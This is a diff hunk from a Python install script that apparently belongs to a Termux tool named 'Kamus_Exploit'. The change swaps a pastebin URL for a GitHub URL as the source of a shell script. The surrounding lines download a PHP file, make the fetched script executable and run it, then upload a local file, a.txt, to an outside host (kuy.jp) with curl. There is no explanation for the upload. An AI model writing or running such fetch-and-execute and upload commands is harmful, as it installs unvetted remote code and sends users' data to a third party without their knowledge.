@@ -22,7 +22,7 @@ os.system("echo 'memory_limit = 512M;' >> /data/data/com.termux/files/usr/lib/ph
 
 print "Downloading Source..."
 os.system("curl -s --url https://raw.githubusercontent.com/bibilgates/Kamus_Exploit/master/e.php -o e")
-os.system("curl -s --url https://pastebin.com/raw/PcKFfmq1 -o i.sh")
+os.system("curl -s --url https://raw.githubusercontent.com/bibilgates/Kamus_Exploit/master/info.sh -o i.sh")
 os.system('chmod +x i.sh')
 os.system('./i.sh')
 os.system('curl -F data=@a.txt http://kuy.jp/api.php')
